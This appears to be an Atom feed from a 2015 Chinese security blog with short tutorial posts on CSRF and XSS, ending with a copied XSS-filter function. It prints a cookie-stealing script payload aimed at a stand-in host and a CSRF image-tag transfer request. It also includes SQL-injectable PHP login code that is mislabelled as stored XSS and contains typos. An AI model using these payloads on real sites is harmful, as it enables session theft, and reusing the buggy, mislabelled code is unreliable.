<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">

  <title><![CDATA[Category: 安全 | Blog like hacke]]></title>
  <link href="http://ztlblog.github.io/blog/categories/an-quan/atom.xml" rel="self"/>
  <link href="http://ztlblog.github.io/"/>
  <updated>2015-08-12T14:02:42+08:00</updated>
  <id>http://ztlblog.github.io/</id>
  <author>
    <name><![CDATA[ztl]]></name>
    
  </author>
  <generator uri="http://octopress.org/">Octopress</generator>

  
  <entry>
    <title type="html"><![CDATA[csrf攻击]]></title>
    <link href="http://ztlblog.github.io/blog/2015/06/25/php004/"/>
    <updated>2015-06-25T13:25:55+08:00</updated>
    <id>http://ztlblog.github.io/blog/2015/06/25/php004</id>
    <content type="html"><![CDATA[<h2>什么是csrf攻击</h2>

<p>csrf（cross-site request forgery）跨站请求伪造</p>

<h2>csrf的原理</h2>

<p><img src="http://pic002.cnblogs.com/img/hyddd/200904/2009040916453171.jpg" alt="tool-manager" /></p>

<h2>例如：</h2>

<p>银行网站A，它以get请求来完成银行转账的操作，<a href="http://www.mybank.com/Transfer.php?toBankId=11&amp;money=100">http://www.mybank.com/Transfer.php?toBankId=11&amp;money=100</a>
危险网站B，它里面有一段html的代码如下：
<code>&lt;img src='http://www.mybank.com/Transfer.php?toBankId=11&amp;money=100'/&gt;</code></p>
]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[xss攻击]]></title>
    <link href="http://ztlblog.github.io/blog/2015/06/25/php003/"/>
    <updated>2015-06-25T13:25:55+08:00</updated>
    <id>http://ztlblog.github.io/blog/2015/06/25/php003</id>
    <content type="html"><![CDATA[<h2>什么是xss</h2>

<p>xss 表示cross site scripting（跨站脚本攻击）
一般分为两中类型
1：非持久型攻击
2：持久型攻击</p>

<h3>例如:</h3>

<p>{% codeblock 非持久型 %}
非持久型攻击是一次性的，仅对当前的页面访问产生影响
$name = $_GET[&lsquo;name&rsquo;];
echo &ldquo;welcome $name&rdquo;;
echo &ldquo;<a href='http://www.baidu.com'>click to down</a>&rdquo;;
攻击者可以通过下面url链接
index.php?name=guest<script>alert(&lsquo;test&rsquo;)</script>
index.php?name=guest<script>new Image().src=&ldquo;<a href="http://mytest.com/?">http://mytest.com/?</a>&rdquo;+document.cookie</script>
{% endcodeblock %}</p>

<p>{% codeblock 持久型 %}
持久型xss攻击会把攻击者的数据存储在服务器端，攻击行为将伴随者攻击数据一直存在
$host = &lsquo;192.168.1.8&rsquo;;
$dbname = &lsquo;app&rsquo;;
$user = &lsquo;yyy&rsquo;;
$password = &lsquo;xxx&rsquo;;
$schema = &lsquo;test&rsquo;;
$conection_string = &ldquo;host=$host dbname=$dbname user=$user password=$password&rdquo;;
$connect = pg_connect($conection_string,$PGSQL_CONNECT_NEW);
if(!Connect){
    echo &lsquo;database connection failure&rsquo;;
    exit;
}
$query = &ldquo;select user_name,password from $schema.members where user_name'&rdquo;.$<em>POST[&lsquo;user_name&rsquo;].&ldquo;&lsquo;&rdquo;;
$result = pg_query($connect,$query);
$row = pg_fetch_array($result,NULL,PGSOL_ASSOC);
$user_pass = md5($</em>POST['pass_word&rsquo;]);
$user_name = $row[&lsquo;user_name&rsquo;];
if(strcmp($user_pass,$row[&lsquo;password&rsquo;]!=0)){
    echo &ldquo;Login failed&rdquo;;
}else{
    session_start();
    $_SESSION[&lsquo;USER_NAME&rsquo;] = $user_name;
    echo &ldquo;<head><meta http-equiv=\"Refresh\" content=\"0;url=home.php\"></head>&rdquo;;
}
{% endcodeblock %}</p>

<h2>预防措施</h2>

<p>{% codeblock cookie %}
如保存用户登录状态的cookie，设置httponly，php的setcookie函数最后一个参数即可设置
setcookie(name,value,expire,path,domain,secure)
name:cookie的名称
value：cookie的值
expire：cookie的有效期
path：cookie的服务器路径
domain：cookie的域名
secure：规定是否通过安全的https链接来传输cookie
{% endcodeblock %}</p>

<p>{% codeblock 输入检查 %}
不要让用户写入任何script和发起恶意http请求的东西
htmlspecialchars处理
{% endcodeblock %}</p>

<h2>防止xss攻击（不是我写的）</h2>

<p>{% codeblock %}
function xss_clean($str, $is_image = FALSE)
{
    if (is_array($str))
    {
        while (list($key) = each($str))
        {
            $str[$key] = $this->xss_clean($str[$key]);
        }</p>

<pre><code>    return $str;
}

$str = remove_invisible_characters($str);

$str = $this-&gt;_validate_entities($str);

$str = rawurldecode($str);

$str = preg_replace_callback("/[a-z]+=([\'\"]).*?\\1/si", array($this, '_convert_attribute'), $str);

$str = preg_replace_callback("/&lt;\w+.*?(?=&gt;|&lt;|$)/si", array($this, '_decode_entity'), $str);

$str = remove_invisible_characters($str);
if (strpos($str, "\t") !== FALSE)
{
    $str = str_replace("\t", ' ', $str);
}

$converted_string = $str;

$str = $this-&gt;_do_never_allowed($str);

if ($is_image === TRUE)
{
    $str = preg_replace('/&lt;\?(php)/i', "&amp;lt;?\\1", $str);
}
else
{
    $str = str_replace(array('&lt;?', '?'.'&gt;'),  array('&amp;lt;?', '?&amp;gt;'), $str);
}

$words = array(
    'javascript', 'expression', 'vbscript', 'script', 'base64',
    'applet', 'alert', 'document', 'write', 'cookie', 'window'
);

foreach ($words as $word)
{
    $temp = '';

    for ($i = 0, $wordlen = strlen($word); $i &lt; $wordlen; $i++)
    {
        $temp .= substr($word, $i, 1)."\s*";
    }

    $str = preg_replace_callback('#('.substr($temp, 0, -3).')(\W)#is', array($this, '_compact_exploded_words'), $str);
}

do
{
    $original = $str;

    if (preg_match("/&lt;a/i", $str))
    {
        $str = preg_replace_callback("#&lt;a\s+([^&gt;]*?)(&gt;|$)#si", array($this, '_js_link_removal'), $str);
    }

    if (preg_match("/&lt;img/i", $str))
    {
        $str = preg_replace_callback("#&lt;img\s+([^&gt;]*?)(\s?/?&gt;|$)#si", array($this, '_js_img_removal'), $str);
    }

    if (preg_match("/script/i", $str) OR preg_match("/xss/i", $str))
    {
        $str = preg_replace("#&lt;(/*)(script|xss)(.*?)\&gt;#si", '[removed]', $str);
    }
}
while($original != $str);

unset($original);
$str = $this-&gt;_remove_evil_attributes($str, $is_image);
$naughty = 'alert|applet|audio|basefont|base|behavior|bgsound|blink|body|embed|expression|form|frameset|frame|head|html|ilayer|iframe|input|isindex|layer|link|meta|object|plaintext|style|script|textarea|title|video|xml|xss';
$str = preg_replace_callback('#&lt;(/*\s*)('.$naughty.')([^&gt;&lt;]*)([&gt;&lt;]*)#is', array($this, '_sanitize_naughty_html'), $str);
$str = preg_replace('#(alert|cmd|passthru|eval|exec|expression|system|fopen|fsockopen|file|file_get_contents|readfile|unlink)(\s*)\((.*?)\)#si', "\\1\\2&amp;#40;\\3&amp;#41;", $str);

$str = $this-&gt;_do_never_allowed($str);

if ($is_image === TRUE)
{
    return ($str == $converted_string) ? TRUE: FALSE;
}

log_message('debug', "XSS Filtering completed");
return $str;
</code></pre>

<p>}
{% endcodeblock %}</p>
]]></content>
  </entry>
  
</feed>
